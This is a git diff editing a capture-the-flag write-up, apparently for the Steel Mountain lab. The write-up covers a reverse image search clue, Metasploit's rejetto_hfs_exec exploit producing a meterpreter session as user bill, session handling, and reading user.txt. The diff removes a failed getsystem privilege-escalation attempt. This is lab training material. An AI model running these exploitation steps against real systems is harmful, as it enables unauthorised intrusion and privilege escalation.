@@ -2,6 +2,7 @@
 
 ### Q1: Who is the employee of the month, hint is to use image reverse search.
 Answer: Bill Harper. 
+
 File name: BillHarper.png sort of gave it away.
 
 ### Not necessary, TinEye provides for BillHarper.png
@@ -81,22 +82,11 @@ msf6 exploit(windows/http/rejetto_hfs_exec) > run
 
 meterpreter > getuid
 Server username: STEELMOUNTAIN\bill
-meterpreter > getsystem
-[-] priv_elevate_getsystem: Operation failed: All pipe instances are busy. The following was attempted:
-[-] Named Pipe Impersonation (In Memory/Admin)
-[-] Named Pipe Impersonation (Dropper/Admin)
-[-] Token Duplication (In Memory/Admin)
-[-] Named Pipe Impersonation (RPCSS variant)
-[-] Named Pipe Impersonation (PrintSpooler variant)
-[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
-meterpreter > getuid
-Server username: STEELMOUNTAIN\bill
-meterpreter > 
 ```
 
 Set meterpreter shell to background with Ctrl + Z and bring back later with 'sessions -i <session-ID>' obtain session-ID using 'sessions -l'.
 
-Quick look I find user.txt manually by entering shell and traversing folders as not sure what file name would be. 
+Find user.txt manually by entering shell and traversing folders.
 
 ```
 C:\Users\bill\Desktop>type user.txt
